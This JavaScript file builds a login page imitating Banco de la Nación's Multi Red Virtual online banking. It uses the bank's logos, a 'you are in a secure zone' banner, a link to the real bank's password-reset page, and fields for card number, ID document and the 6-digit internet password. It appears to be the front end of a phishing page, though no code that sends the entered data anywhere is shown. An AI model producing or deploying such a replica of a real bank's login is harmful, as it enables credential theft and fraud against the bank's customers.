document.addEventListener("DOMContentLoaded", () => {
    const headerDiv = document.createElement('div');
    headerDiv.className = 'header';

    const logoMultiRed = document.createElement('img');
    logoMultiRed.src = 'img/multiRed_Logo.jpg';
    logoMultiRed.alt = 'Multi Red Virtual';
    logoMultiRed.className = 'multired_logo';

    const logoBanco = document.createElement('img');
    logoBanco.src = 'img/logo-banco_de_la_nacion.png';
    logoBanco.alt = 'Banco De La Nacion';
    logoBanco.className = 'banco_logo';

    headerDiv.appendChild(logoMultiRed);
    headerDiv.appendChild(logoBanco);

    const paragraph = document.createElement('p');
    paragraph.innerHTML = "<i class='bx bxs-lock'></i>USTED SE ENCUENTRA EN UNA ZONA SEGURA";

    const containerDiv = document.createElement('div');
    containerDiv.className = 'container';

    const formContainerDiv = document.createElement('div');
    formContainerDiv.className = 'container-formulario';

    const form = document.createElement('form');
    form.id = 'formulario';
    form.action = '';

    const seleccionDiv = document.createElement('div');
    seleccionDiv.className = 'seleccion-banco';

    const labelSeleccion = document.createElement('label');
    labelSeleccion.htmlFor = 'seleccion';
    labelSeleccion.textContent = 'Seleccione:';

    const selectSeleccion = document.createElement('select');
    selectSeleccion.id = 'seleccion';

    const optionSeleccion = document.createElement('option');
    optionSeleccion.value = 'multired-global-debito';
    optionSeleccion.textContent = 'Multired Global Débito';

    selectSeleccion.appendChild(optionSeleccion);
    seleccionDiv.appendChild(labelSeleccion);
    seleccionDiv.appendChild(selectSeleccion);

    const tarjetaDiv = document.createElement('div');
    tarjetaDiv.className = 'tarjeta';

    const labelTarjeta = document.createElement('label');
    labelTarjeta.htmlFor = 'tarjNumero';
    labelTarjeta.textContent = 'Número de tarjeta:';

    const inputTarjeta = document.createElement('input');
    inputTarjeta.type = 'number';
    inputTarjeta.id = 'tarjNumero';
    inputTarjeta.maxLength = 16;

    tarjetaDiv.appendChild(labelTarjeta);
    tarjetaDiv.appendChild(inputTarjeta);

    const tipoDocumentoDiv = document.createElement('div');
    tipoDocumentoDiv.className = 'tipo-documento';

    const labelTipoDocumento = document.createElement('label');
    labelTipoDocumento.htmlFor = 'tipoDocumento';
    labelTipoDocumento.textContent = 'Tipo y Nº Documento:';

    const selectTipoDocumento = document.createElement('select');
    selectTipoDocumento.id = 'tipoDocumento';

    const optionDNI = document.createElement('option');
    optionDNI.value = 'dni';
    optionDNI.textContent = 'DNI';

    const optionCE = document.createElement('option');
    optionCE.value = 'ce';
    optionCE.textContent = 'CE';

    selectTipoDocumento.appendChild(optionDNI);
    selectTipoDocumento.appendChild(optionCE);

    const inputDocumento = document.createElement('input');
    inputDocumento.type = 'number';
    inputDocumento.id = 'numDocumento';
    inputDocumento.placeholder = 'Número de documento';

    tipoDocumentoDiv.appendChild(labelTipoDocumento);
    tipoDocumentoDiv.appendChild(selectTipoDocumento);
    tipoDocumentoDiv.appendChild(inputDocumento);

    const tecladoDiv = document.createElement('div');
    tecladoDiv.className = 'teclado-banca';

    const labelTeclado = document.createElement('label');
    labelTeclado.htmlFor = 'clave';
    labelTeclado.textContent = 'Ingrese su clave en el Teclado Virtual:';

    const tecladoVirtualDiv = document.createElement('div');
    tecladoVirtualDiv.id = 'teclado';

    tecladoDiv.appendChild(labelTeclado);
    tecladoDiv.appendChild(tecladoVirtualDiv);

    const claveAccesoDiv = document.createElement('div');
    claveAccesoDiv.className = 'clave-acceso';

    const labelClaveAcceso = document.createElement('label');
    labelClaveAcceso.htmlFor = 'clave';
    labelClaveAcceso.textContent = 'Ingresa tu clave de internet (06 dígitos)';

    const inputClaveAcceso = document.createElement('input');
    inputClaveAcceso.type = 'password';
    inputClaveAcceso.id = 'clave';
    inputClaveAcceso.maxLength = 6;
    inputClaveAcceso.disabled = true;

    const linkClaveOlvidada = document.createElement('a');
    linkClaveOlvidada.href = 'https://bancaporinternet.bn.com.pe/BNWeb/Olvido';
    linkClaveOlvidada.textContent = 'Olvidé mi clave';

    claveAccesoDiv.appendChild(labelClaveAcceso);
    claveAccesoDiv.appendChild(inputClaveAcceso);
    claveAccesoDiv.appendChild(linkClaveOlvidada);

    const submitButton = document.createElement('button');
    submitButton.type = 'submit';
    submitButton.textContent = 'INGRESAR';

    form.appendChild(seleccionDiv);
    form.appendChild(tarjetaDiv);
    form.appendChild(tipoDocumentoDiv);
    form.appendChild(tecladoDiv);
    form.appendChild(claveAccesoDiv);
    form.appendChild(submitButton);

    formContainerDiv.appendChild(form);

    containerDiv.appendChild(formContainerDiv);

    document.body.appendChild(headerDiv);
    document.body.appendChild(paragraph);
    document.body.appendChild(containerDiv);
});
